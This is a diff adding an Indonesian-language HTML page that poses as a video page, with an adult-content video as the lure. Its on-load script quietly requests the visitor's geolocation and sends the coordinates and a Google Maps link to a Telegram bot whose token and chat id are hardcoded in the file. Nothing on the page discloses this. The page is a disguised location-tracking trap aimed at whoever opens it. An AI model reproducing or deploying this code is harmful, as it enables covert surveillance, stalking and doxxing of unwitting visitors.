@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Video Page</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: black;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    video {
+      width: 320px;
+      height: 240px;
+      border: 8px solid #333;
+      border-radius: 12px;
+      box-shadow: 0 0 20px #000;
+      background: black;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Ganti dengan video kamu -->
+  <video autoplay muted playsinline>
+    <source src="bokep.mp4" type="video/mp4">
+    Browser kamu tidak mendukung video.
+  </video>
+
+  <script>
+    window.onload = function() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          const token = '7939125410:AAHyjkU2NJa33Bkcuzb3_8KoxviSzEkmeRg';
+          const chat_id = '7819779147';
+          const message = `Pengunjung membuka halaman!\nLokasi:\nLatitude: ${latitude}\nLongitude: ${longitude}\nGoogle Maps: https://maps.google.com/?q=${latitude},${longitude}`;
+          
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              chat_id: chat_id,
+              text: message
+            })
+          });
+        }, function(error) {
+          console.log("Gagal ambil lokasi:", error.message);
+        });
+      } else {
+        console.log("Geolocation tidak didukung di browser ini.");
+      }
+    }
+  </script>
+
+</body>
+</html>
